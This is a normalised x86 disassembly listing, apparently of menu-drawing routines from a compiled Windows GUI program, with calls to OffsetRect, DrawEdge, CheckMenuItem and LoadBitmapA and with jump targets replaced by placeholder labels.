mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44827f
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_446804
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447740
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_448298
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_448ba0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41e184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d9b8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41e184
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444754
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e904
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41e184
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41e184
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e17c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4230e8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e158
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e528
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ffc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4486e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4220e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41d9b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444754
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e184
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447740
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41dc84
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e904
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e62c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_444a44
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e904
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41e47c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41d9b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403294
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_447740
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448ba7
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_446804
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41e764
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_447740
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_448cf4
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4496d8
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_448d24
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_448d70
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_448f52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403490
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_448d24
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4496d8
mov esi eax
mov eax edi
call sub_448cf4
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402ca4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4040e8
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_446804
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40435c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f59
lea eax [ ebp - 0x24 ]
call sub_404050
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_447740
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_448f84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_40445c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4040a4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_448fac
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44911c
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44912c
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_448ff4
sub_448ff4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4476b0
push eax
call CheckMenuItem
mov eax esi
call sub_448fac
sub_449048
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
